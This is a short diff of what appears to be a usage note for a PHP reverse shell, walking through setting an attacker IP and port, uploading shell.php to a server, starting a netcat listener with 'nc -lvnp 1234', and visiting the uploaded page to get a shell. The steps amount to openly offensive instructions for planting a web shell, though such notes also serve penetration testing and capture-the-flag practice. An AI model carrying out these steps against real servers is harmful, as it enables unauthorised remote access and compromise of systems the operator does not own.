@@ -22,12 +22,15 @@
                   ``-..__``--`
 
 Chage your script - 
+
 $ip = '127.0.0.1';  // CHANGE THIS
+
 $port = 1234;       // CHANGE THIS
 
 Upload to server! 
 
 Start a listener on your machine - 
+
 nc -lvnp 1234
 
 Navigate to ip/shell.php
